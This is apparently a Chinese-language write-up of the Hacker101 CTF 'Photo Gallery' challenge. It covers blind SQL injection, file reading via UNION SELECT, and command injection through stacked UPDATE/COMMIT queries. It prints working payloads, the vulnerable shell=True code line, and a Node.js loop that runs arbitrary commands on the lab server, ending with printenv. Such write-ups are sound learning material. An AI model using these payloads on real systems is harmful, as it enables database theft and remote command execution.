---
title: Hacker 101 CTF Write Up Part 4 - Photo Gallery
categories: Security
date: 2019-09-10 22:28:20
tags: [CTF, security]
header-img: /images/banner.jpg
catalog: true
---

# Photo Gallery

<!-- more -->

## 0x00 
一開始畫面長這樣  
![](/images/ctf/part4-photo-1-01.png)

發現原始碼有一個 fetch?id=1  
![](/images/ctf/part4-photo-1-02.png)

點進去網址發現回傳一個 jpg 的 text 檔案  
![](/images/ctf/part4-photo-1-03.png)

從這可以推測他是用 id 去 mysql 取出 filename 然後讀出來的  
加個 ' 發現好像沒有 SQL Injection 的存在，但卻出現 `500 Internal Server Error`  
可能程式有哪邊出錯了，繼續往下測試  
![](/images/ctf/part4-photo-1-04.png)

不過當改下 `fetch?id=1 union all select 1` 以及 `fetch?id=1 union all select 1,2` 發生一點不同變化
前者出現跟 `fetch?id=1` 結果一模一樣 (上圖)  
後者卻出現 `500 Internal Server Error` (下圖)  
![](/images/ctf/part4-photo-1-05.png)
![](/images/ctf/part4-photo-1-06.png)

看來就是有 SQL Injection 的問題了  
接下來找到可以用 `fetch?id=1 and length(database()) = 6` 這種方式去判斷後者是否為 true  
思路大概跟這篇做法一樣 https://www.hackthis.co.uk/articles/blind-sql-injection  
用各種 `length()` 以及 `like '______'` 的方式可以找到相對應的值  
這邊就直接丟 sqlmap 把整個 table dump 出來了  
就發現 FLAG 了
![](/images/ctf/part4-photo-1-07.png)

## 0x01

這提跟前一提的 `fetch?id=1 union all select 1` Payload 有關係  
前面有提到是透過 id 去撈 filename 回來去顯示  
改成 `fetch?id=123123 union all select "files/adorable.jpg"` 發現可以正確觸發  
![](/images/ctf/part4-photo-2-01.png)

LFI 漏洞就出現了，我可以任意去讀檔案了  
本來想說這 php 寫的網站用以下的 payload，結果取得不到 ...  
`fetch?id=123123 union all select "index.php"`
![](/images/ctf/part4-photo-2-02.png)

後來看提示才知道這是用 uwsgi-nginx-flask-docker image 做的  
此 image 原始碼在放在 main.py，所以改成以下 payload 就讀到原始碼，發現第二個 FLAG
`fetch?id=123123 union all select "main.py"`
![](/images/ctf/part4-photo-2-03.png)

## 0x02

看到 source code 之後，發現在取得 used space 那邊有 command injection 的問題  
`subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1]`  
只要能在 filename 加上 ; 再加上後面想要執行的指令就可以觸發 CI 的問題了  
但要觸發他必須要靠 photos table 裡面的 filename 去觸發  
一開始嘗試使用 stacked query 的方式，以下為 payload  
`541; UPDATE photos SET filename = '; ls ' WHERE id = 3;`  

試了很久完全沒有任何反應，本來以為不是 stacked query 這條路  
結果回去翻題目的提示有提到 COMMIT 這個關鍵字  
才想到有時候 SQL 指令下 UPDATE 變更完並不會馬上生效  
而是要下 `COMMIT;` UPDATE 的語法才會真正觸發  
於是 Payload 改成以下這樣就成功了，下面變成 uwsgi.ini 了  
`fetch?id=541; UPDATE photos SET filename = "; ls" WHERE id = 3; COMMIT;`
![](/images/ctf/part4-photo-3-01.png)

然後根據 main.py 的 regex 修改一下，然後寫出一個可以一直輸入 command 的 node.js 程式
```javascript=
function inputFunction(readline) {
    readline.question(`Keep input\n\n`, async (command) => {
        const axios = require('axios')
        await axios({
            method: 'GET',
            url: 'http://34.74.105.127/8142a5acbe/fetch',
            params: {
                id: `541; UPDATE photos SET filename = '; ${command} | tr "\\n" ";" ' WHERE id = 3; COMMIT;`
            }
        }).then(response => response.data).catch((err) => {
            return;
        })
        let result = await axios({
            method: 'GET',
            url: 'http://34.74.105.127/8142a5acbe/'
        }).then(response => response.data)
        console.log('\n' + result.split('Space used: ')[1].split('</i></div>')[0].replace(/;/g, "\n"));  
        inputFunction(readline)
    })
}
(() => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    })
    inputFunction(readline)
})()
```

但是逛了老半天 ... 完全不知道 flag 放在哪裡  
跑回去看題目提示到 『enviroment』，才想到有可能放在應用程式裡面的環境  
最後下一個 `printenv` 就拿到 FLAG 了 ！
![](/images/ctf/part4-photo-3-02.png)

簡單 demo 影片  
![](/images/ctf/part4-photo-demo.gif)

# 後記  

這題蠻有趣的，學到 stacked query、command injection 以及 LFI
不過過程中有些真的不知道怎麼做，跑去看提示才知道  
不然真的瞎子摸象摸不太出來 QQ  